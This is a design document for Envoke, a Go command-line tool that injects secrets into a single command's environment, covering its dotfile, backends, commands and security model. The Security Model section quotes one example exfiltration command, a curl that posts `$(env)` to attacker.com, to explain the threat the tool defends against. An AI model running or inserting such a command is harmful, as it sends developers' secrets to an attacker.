# Envoke — Design Document

**Command:** `ee`
**Language:** Go
**Binary:** single static binary, cross-compiles to Windows/macOS/Linux

---

## Problem

Secrets management for local development is broken:

- `.env` files get committed accidentally
- `.env.example` files go stale immediately
- Every developer has a different setup
- Secrets are loaded globally into the shell environment, exposing them to every process — including every package you install
- `envchain` (the closest prior art) is macOS/Linux only, supports one backend, and one namespace per invocation

Onboarding is an archaeology project. Supply chain attacks increasingly exploit the fact that secrets are ambient in the developer environment.

---

## Core Concept

Secrets are injected **per command**, not loaded globally. Envoke reads a project dotfile, fetches the required secrets from one or more backends, and spawns your command as a subprocess with those secrets in its environment. Nothing persists. Nothing leaks sideways.

```
$ ee -- make dev
$ ee -- psql -h $DB_HOST -U $DB_USER
$ ee -- aider --model claude-sonnet-4-6
```

The project dotfile (`.envoke`) is committed to git. It contains no secrets — only the *shape* of the environment: which namespaces are needed and which backend holds them.

---

## The Dotfile

`.envoke` lives in the project root and is committed to git. Format is YAML:

```yaml
namespaces:
- name: aws-dev
  backend: aws
- name: db-local       # backend: keychain is the default and can be omitted
- name: stripe-test
  backend: 1password
```

No secrets. Safe to commit, useful to review in PRs.

### Config layering

```
~/.config/envoke/config.yaml    ← your backends, your credentials  (gitignored)
<project>/.envoke               ← what this project needs           (committed)
<project>/.envoke.local         ← your personal overrides           (gitignored)
```

The global config describes *how* to reach backends. The dotfile describes *what* the project needs. A Windows dev and a Mac dev share the same `.envoke`; their global configs differ.

---

## Backends

Backends implement a single interface:

```go
type Backend interface {
    Get(namespace, key string) (string, error)
    Set(namespace, key, value string) error
    List(namespace string) ([]string, error)
}
```

### Implemented

| Backend | Key | Platform | Notes |
|---------|-----|----------|-------|
| `keychain` | Always compiled in | Windows, macOS, Linux | Credential Manager / Keychain / Secret Service via `99designs/keyring`. Default backend. |
| `shell` | Always compiled in | All | Runs arbitrary shell commands to obtain secrets. Read-only. |
| `aws` | Build tag `aws` | All | AWS Secrets Manager; keys stored as JSON fields in one secret per namespace |
| `1password` | Build tag `1password` | All | 1Password Secrets Manager SDK; read-only via service account token |

### Planned / Stub

| Backend | Build tag | Notes |
|---------|-----------|-------|
| `keeper` | `keeper` | Keeper Secrets Manager — stub, not yet implemented |
| `jumpcloud` | `jumpcloud` | JumpCloud Password Manager — stub, not yet implemented |
| `sops` | — | Encrypted files in git |
| `vault` | — | HashiCorp Vault |

Backend access is protected by whatever the backend enforces — Touch ID, Face ID, MFA, hardware tokens. Envoke inherits this for free.

---

## Security Model

### Per-command injection

Secrets are never in the ambient shell environment. They exist only in the subprocess spawned by `ee`. A compromised dependency, build script, or background process cannot read them.

### Supply chain attack surface

A malicious `postinstall` script that runs `curl attacker.com -d "$(env)"` gets nothing useful — because the secrets were never in the environment to begin with. This is the primary threat model Envoke addresses versus `.env`/`direnv` approaches.

### Agent isolation

AI coding agents (`aider`, `claude`, etc.) can be run via `ee` without ever touching the secret store directly. The agent reads `$DB_HOST` from its environment like any other program. It never authenticates to Keeper or JumpCloud. The blast radius for a compromised agent is limited to the process lifetime.

---

## Commands

### `ee [--] <command>`

Run a command with secrets from the project's `.envoke` injected into its environment. `--` is optional when no namespace is specified.

### `ee <namespace> -- <command>`

Run a command with a single keychain namespace injected. Bypasses `.envoke` entirely. `--` is required to separate the namespace from the command.

### `ee set <namespace> <key> [value]`

Store a secret in the backend configured for that namespace. If value is omitted, reads from stdin with echo suppressed. If `.envoke` already exists, adds the namespace to it if not already declared.

### `ee list [namespace]`

List secret key names in a namespace, or across all namespaces declared in `.envoke`. Never prints values.

### `ee status`

Show the authentication and reachability status for all namespaces in the current project. Degrades to plain text in non-interactive environments.

### `ee config path`

Print the path to the global config file.

### `ee config edit`

Open the global config file in `$EDITOR` (Unix) or `notepad.exe` (Windows). Falls back to `vi`. In non-interactive environments, prints the path instead.

### `ee config show`

Display the current global config with sensitive values redacted.

---

## TUI

Built with **Bubble Tea** (charmbracelet). Components from `bubbles` (list, table, textinput, spinner). Styling via `lipgloss`. All TUI features degrade gracefully to plain output in non-interactive environments (CI, piped output).

---

## Implementation Notes

- `gopkg.in/yaml.v3` for dotfile and global config parsing
- `99designs/keyring` for OS keychain abstraction
- Keeper and JumpCloud have official Go SDKs
- `cobra` for CLI structure
- Single binary, no runtime dependency, cross-compiles from any machine

---

## This Is a Team Primitive

`envchain` is a personal productivity tool. Envoke is a team contract.

The committed dotfile makes secret management visible and reviewable. New developers clone the repo, run `ee -- make dev`, and it works. No "ask someone which env vars you need." No stale `.env.example` to maintain. The secret surface is auditable in pull requests.
